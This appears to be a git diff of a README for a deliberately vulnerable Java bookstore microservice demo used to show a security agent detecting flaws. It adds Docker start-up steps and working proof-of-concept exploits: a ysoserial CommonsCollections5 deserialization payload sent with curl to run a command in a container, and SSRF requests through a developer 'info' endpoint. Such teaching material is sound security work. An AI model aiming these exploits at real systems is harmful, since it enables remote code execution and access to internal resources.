@@ -34,7 +34,18 @@ The bookstore-debug app is a Dropwizard app that offers info to the devs:
 
 The first step is to start all 3 of the services, which will run on ports 8000, 8001 and 8002, respectively.
 
-Each service has a Dockerfile to make running 1 step. Consult each service's `README.md` to see the commands.
+To start normally:
+```
+$ docker-compose up
+```
+
+To start with Contrast enabled, first edit contrast_security.yaml with your agent credentials, then:
+```
+$ cp /path/to/contrast.jar .
+$ docker-compose -f docker-compose.yml -f docker-compose-contrast.yml up
+```
+
+If you don't want to use docker-compose, each service has a Dockerfile to make running 1 step. Consult each service's `README.md` to see the commands.
 
 ### Using the services
 
@@ -66,7 +77,7 @@ $ curl http://localhost:8000/debug
 ```
 
 ## Detecting the vulnerabilities
-To add the Java Agent to all the services above:
+To detect the vulnerabilities, start the apps with Contrast enabled as described above.  Then use the services to exercise the code.  It should not be necessary to exploit the vulnerabilities, in order for Contrast to identify the vulnerabilities.
 
 ## Exploiting the Vulnerabilities
 
@@ -92,16 +103,22 @@ type.
 
 To exploit this, we must first make an exploit that creates a file in `/tmp` as a proof-of-concept:
 ```
-$ git clone ysoserial
-$ docker run ysoserial-bookstore CommonsCollections5 'touch /tmp/hacked' > commonscollections5.ser
+$ git clone https://github.com/frohoff/ysoserial
+$ cd ysoserial
+$ docker build -t ysoserial .
+$ docker run --rm ysoserial CommonsCollections5 '/usr/bin/touch /tmp/hacked' > commonscollections5.ser
 ```
 
 Now you can send the exploit generated in the `commonscollections5.ser` file:
 ```
-$ curl -vv -X POST -H "Content-Type: application/octet-stream" --data-binary @commonscollections5.ser http://localhost:8001/update
+$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@commonscollections5.ser" http://localhost:8001/update
 ```
 
-To prove that we created this `/tmp/hacked` file, we must shell into the running container. Let's get the ID:
+To prove that we created this `/tmp/hacked` file, we must shell into the running container. 
+
+If you started with docker-compose, the container ID is something like java-microservice-sample-apps_bookstore-datamanager_1.
+
+If you ran the containers manually, you can start with the ID:
 ```
 $ docker ps
 CONTAINER ID        IMAGE                    COMMAND                 CREATED              STATUS              PORTS                              NAMES
@@ -110,16 +127,19 @@ CONTAINER ID        IMAGE                    COMMAND                 CREATED    
 
 Now, using that container ID, we shell into the container and confirm the exploit created the `/tmp/hacked` file:
 ```
-$ docker exec -it 3729e1f30284 bash
-\# ls -al /tmp
+$ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /tmp/hacked
 ...
-*/tmp/hacked*
+-rw-r--r-- 1 root root 0 <time> /tmp/hacked
 ```
 
-### Same-Site Request Forgery (SSRF)
-The `bookstore-frontend` exposes a "info" service, only intended for developers. It is intended to be used to rertieve data about diffferent developer environments, but it can be used to force the app to retrieve data from other URLs:
+### Server Side Request Forgery (SSRF)
+The `bookstore-frontend` exposes a "info" service, only intended for developers. It is intended to be used to rertieve data about different developer environments, but it can be used to force the app to retrieve data from other URLs:
 ```
 $ curl http://localhost:8002/application/info?env=google.com/?
 ```
 
 Obviously in this case we ask the server to retrieve Google content, but it could as easily be pointed towards URLs typically only accessed within your perimeter.
+
+```
+$ curl http://localhost:8002/application/info?env=SECRET
+```
